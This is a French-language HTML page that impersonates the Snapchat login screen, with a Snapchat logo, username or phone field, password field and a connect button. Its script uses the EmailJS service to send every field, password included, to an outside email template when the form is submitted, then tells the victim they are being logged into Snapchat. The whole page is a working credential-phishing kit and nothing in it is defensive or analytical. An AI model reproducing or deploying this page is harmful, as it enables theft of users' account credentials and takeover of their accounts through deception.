<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion - Mon Site</title>
  <!-- Lien vers Google Fonts pour la police de caractère -->
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
    }
    .container {
      width: 350px; /* Augmenté la largeur */
      padding: 20px;
      background-color: #fff;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
      text-align: center;
      position: relative; /* Nécessaire pour positionner la signature */
    }
    h2 {
      color: #000000;
      font-size: 24px; /* Augmenté la taille de la police */
    }

    h3 {
      color: #66b1efed;
      font-size: 18px; /* Augmenté la taille de la police */
      text-align: left;
      margin-bottom: 8px; /* Ajouter un espace pour une meilleure lisibilité */
    }

    .field {
      margin-bottom: 28px;
    }
    .field label {
      display: block;
      font-size: 16px; /* Augmenté la taille de la police */
      margin-bottom: 5px;
    }
    .field input {
      width: 100%;
      padding: 10px;
      font-size: 16px; /* Augmenté la taille de la police */
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .field input[type="text"] {
      color: #008cff; /* Bleu clair */
    }
    .link {
      display: block;
      margin-bottom: 10px;
      font-size: 16px; /* Augmenté la taille de la police */
      color: #008cff;
      text-decoration: none;
      cursor: pointer; /* Ajouter le curseur de pointeur pour le lien */
    }
    .link:hover {
      text-decoration: underline;
    }
    .checkbox-container {
      display: flex;
      align-items: center; /* Aligner le check avec la phrase */
      margin-bottom: 15px; /* Ajusté pour un meilleur espacement */
      font-size: 16px; /* Augmenté la taille de la police */
    }
    .checkbox-container input {
      margin-right: 10px; /* Augmenté l'espacement entre le check et la phrase */
      accent-color: #008cff; /* Check en bleu clair */
    }
    .checkbox-container label {
      margin: 0;
      line-height: 1.4; /* Ajuster l'espacement des lignes */
      display: flex;
      align-items: center; /* Aligner verticalement le texte avec le check */
    }
    .field input[type="submit"] {
      background-color: #ccc; /* Gris */
      color: #ffffff;
      border: none;
      cursor: pointer;
      padding: 10px;
      font-size: 16px; /* Augmenté la taille de la police */
      border-radius: 20px; /* Contours plus arrondis */
      margin-top: 30px; /* Faire descendre plus en bas */
      width: 80%; /* Réduire la largeur du bouton */
    }
    .field input[type="submit"]:hover {
      background-color: #bbb;
    }
    .forgot-password {
      color: #008cff; /* Bleu clair */
      display: block;
      margin-bottom: 20px; /* Espacement avant le bouton de connexion */
    }
    #confirmation {
      display: none;
      color: green;
      font-size: 16px; /* Augmenté la taille de la police */
    }
    .signature {
      position: absolute;
      bottom: 10px;
      right: 10px;
      text-align: right;
      display: flex;
      align-items: center; /* Aligner verticalement l'image et le texte */
    }
    .signature img {
      width: 30px;
      height: auto;
    }
    .signature span {
      color: #fffc00; /* Jaune */
      font-size: 18px; /* Augmenté la taille de la police */
      font-weight: bold; /* En gras */
      margin-left: 5px;
      vertical-align: middle;
      font-family: 'Press Start 2P', cursive; /* Police de caractère de thème jeu */
    }
    /* Media queries pour responsive design */
    @media (max-width: 600px) {
      .container {
        width: 100%; /* Utiliser toute la largeur de l'écran */
        padding: 10px;
      }
      .field input {
        font-size: 14px; /* Réduire la taille de la police pour les petits écrans */
      }
      .field input[type="submit"] {
        width: 90%; /* Augmenter la largeur du bouton pour les petits écrans */
      }
      h2, h3 {
        font-size: 16px; /* Réduire la taille de la police pour les petits écrans */
      }
      .forgot-password, .link {
        font-size: 14px; /* Réduire la taille de la police pour les petits écrans */
      }
    }
  </style>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
  <script type="text/javascript">
    (function() {
      emailjs.init('g4HTytQL092Xue3Ar'); // Clé publique
    })();

    // Fonction pour basculer entre NOM D'UTILISATEUR et NUMÉRO DE TÉLÉPHONE
    function toggleLabel() {
      const label = document.querySelector('label[for="username"]');
      const input = document.getElementById('username');
      if (label && input) {
        if (label.textContent === "NOM D'UTILISATEUR OU ADRESSE E-MAIL") {
          label.textContent = "NUMÉRO DE TÉLÉPHONE";
          input.type = "tel";
          input.name = "telephone";
        } else {
          label.textContent = "NOM D'UTILISATEUR OU ADRESSE E-MAIL";
          input.type = "text";
          input.name = "username";
        }
      }
    }
  </script>
</head>
<body>
  <div class="container">
    <h2>Connexion</h2>
    <form id="form">
      <div class="field">
        <h3><label for="username">NOM D'UTILISATEUR OU ADRESSE E-MAIL</label></h3>
        <input type="text" name="username" id="username">
      </div>
      <h3><a href="#" class="link" onclick="toggleLabel()">Utiliser mon numéro de téléphone</a></h3>
      <div class="field">
        <h3><label for="password">MOT DE PASSE</label></h3>
        <input type="password" name="password" id="password">
      </div>
      <div class="checkbox-container">
        <input type="checkbox" id="save-info">
        <label for="save-info">Enregistrer les informations de connexion sur votre appareil</label>
      </div>
      <a href="#" class="forgot-password">Mot de passe oublié ?</a>
      <div class="field">
        <input type="submit" id="button" value="Connexion">
      </div>
    </form>
    <div id="confirmation">
      Les informations de connexion ont été envoyées !
    </div>
    <!-- Signature Snapchat -->
    <div class="signature">
      <img src="snapchat_logo.png" alt="Snapchat logo"> <!-- Remplacer par le nom de votre image -->
      <span>Snapchat</span>
    </div>
  </div>
  <script>
    const btn = document.getElementById('button');

    document.getElementById('form').addEventListener('submit', function(event) {
      event.preventDefault();

      btn.value = 'Envoi...';

      console.log('Envoi en cours...');

      const serviceID = 'service_7xtpexj';
      const templateID = 'template_3jr5npg';

      emailjs.sendForm(serviceID, templateID, this)
        .then(() => {
          console.log('Email envoyé avec succès');
          btn.value = 'Connexion';
          alert('Vous allez être connecté à votre compte Snapchat'); // Alerte à la place du message de confirmation
        }, (err) => {
          console.error('Erreur lors de l\'envoi de l\'email :', err);
          btn.value = 'Connexion';
          alert(JSON.stringify(err));
        });
    });
  </script>
</body>
</html>
